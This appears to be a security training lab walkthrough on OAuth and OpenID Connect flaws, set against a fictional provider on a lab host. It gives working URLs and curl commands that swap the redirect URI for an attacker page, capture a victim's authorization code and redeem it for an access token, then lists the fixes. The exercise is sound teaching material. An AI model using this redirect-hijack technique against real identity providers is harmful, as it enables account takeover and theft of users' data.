# OAuth and OpenID Connect: Redirects, State, and Token Trust

## Before You Begin

- [ ] You have completed **Secure Authentication**
- [ ] You have the exercise panel open
- [ ] You can edit a URL in the browser, or use `curl`
- [ ] You will use only the fictional Community ID provider
- [ ] You will not test redirect URI handling against a real provider

!!! note "OAuth is delegation, not authentication by itself"
    OAuth grants an application limited access to a resource. OpenID Connect
    adds an identity layer. Both depend on the client and provider validating
    redirects, state, codes, and tokens.

## Scenario

A community centre has started using **Community ID**, a fictional single
sign-on provider, for a new volunteer portal. The portal team registered the
client in a hurry.

The client accepts any redirect URI, does not require a `state` value, and does
not use PKCE. Your job is to see where the authorization code can be delivered,
exchange it for an access token, and read the victim's profile.

## Background

| Term | Meaning |
|---|---|
| **Client** | The application asking to sign a user in, such as the volunteer portal. |
| **Provider** | The identity service that authenticates the user and issues codes or tokens. |
| **Redirect URI** | Where the provider sends the user after sign-in. It must be exact and pre-registered. |
| **State** | A per-request value that ties the callback to the request the client started. |
| **PKCE** | A proof key that stops a stolen authorization code from being redeemed by someone else. |
| **Access token** | A bearer credential for an API. It must be audience-bound, short-lived, and protected. |

In the authorization-code flow:

1. The client sends the user to the provider with `client_id`, `redirect_uri`,
   `response_type=code`, and `state`.
2. The user signs in and consents.
3. The provider redirects to the registered `redirect_uri` with a short-lived
   `code` and the same `state`.
4. The client verifies `state` and exchanges the code for tokens.
5. The client calls the resource server with the access token.

## Walkthrough

### Step 1: Start the sign-in flow

Open:

```text
http://identity-oauth.lab:8080/
```

Choose **Continue**. Look at the address bar. The provider URL contains:

```text
/authorize?client_id=community-portal
&redirect_uri=http://identity-oauth.lab:8080/callback
&response_type=code
&state=demo-state
```

The debug panel on the page shows that the client accepts any `redirect_uri`
and does not require `state` or PKCE.

### Step 2: Change the callback

Replace the callback with the simulated attacker page:

```text
http://identity-oauth.lab:8080/attacker
```

The full URL becomes:

```text
http://identity-oauth.lab:8080/authorize?client_id=community-portal&redirect_uri=http://identity-oauth.lab:8080/attacker&response_type=code&state=demo-state
```

Open it. The provider accepts the new callback because there is no exact
allowlist.

### Step 3: Capture the code

The attacker page receives a code and displays it. The code was issued for the
victim, `amara`, but delivered to a callback the client did not intend to trust.

This is the core failure: the provider trusted the client's redirect URI, and
the client never tied the callback to its original request with `state`.

### Step 4: Exchange the code

Choose **Exchange the code**. The provider returns JSON:

```json
{
  "access_token": "ACCESS-TOKEN-amara-7f3a",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "profile"
}
```

Copy the `access_token` value.

### Step 5: Read the victim profile

Open:

```text
http://identity-oauth.lab:8080/me?access_token=ACCESS-TOKEN-amara-7f3a
```

The profile contains the training token. Copy the `OCR{...}` value into the flag
box.

### Step 6: Name the missing controls

The flow succeeded because:

- the provider accepted an unregistered redirect URI;
- the client did not send or verify a `state` value;
- the client did not use PKCE;
- the code was not bound tightly to the client and callback;
- the access token was accepted without a client-session check.

## The Fixes

| Problem | Fix |
|---|---|
| Any redirect URI accepted | Register an exact allowlist and reject everything else, including lookalike hosts and open redirects |
| No request binding | Send a random `state` value and verify it on the callback |
| Public client code theft | Use PKCE (`code_challenge` / `code_verifier`) |
| Reusable codes | Make codes short-lived and one-time, and bind them to the client |
| Token misuse | Validate issuer, audience, expiry, and scope; keep tokens out of URLs and scripts |
| Broad access | Request the smallest scope and use short token lifetimes |

## If You Do Not Have a Browser

Use `curl` to follow the same flow:

```bash
# Ask the provider to send a code to the attacker callback
curl -s -o /dev/null -w '%{redirect_url}' \
  'http://identity-oauth.lab:8080/authorize?client_id=community-portal&redirect_uri=http://identity-oauth.lab:8080/attacker&response_type=code&state=demo'

# Exchange the code
curl -s 'http://identity-oauth.lab:8080/token?code=AUTH-CODE-7f3a&client_id=community-portal'

# Read the profile
curl -s 'http://identity-oauth.lab:8080/me?access_token=ACCESS-TOKEN-amara-7f3a'
```

## Analysis Questions

**1. Which parameter tells the provider where to send the user after sign-in?**

**2. Why must the redirect URI be an exact allowlist rather than a prefix or
pattern?**

**3. What does `state` protect against?**

**4. How does PKCE change the impact of a stolen authorization code?**

**5. Why is an access token described as a bearer credential?**

**6. What should the client check before accepting an identity token?**

**7. Where should a browser-based client store tokens, and where should it not?**

## Accessibility

- The flow is URL-driven. You can complete it with a keyboard and copy/paste.
- If editing a long URL is difficult, use the `curl` commands above.
- The debug panel is plain text and lists the missing controls.
- If a screen reader reads the URL poorly, use the `curl` path and read the
  response one field at a time.
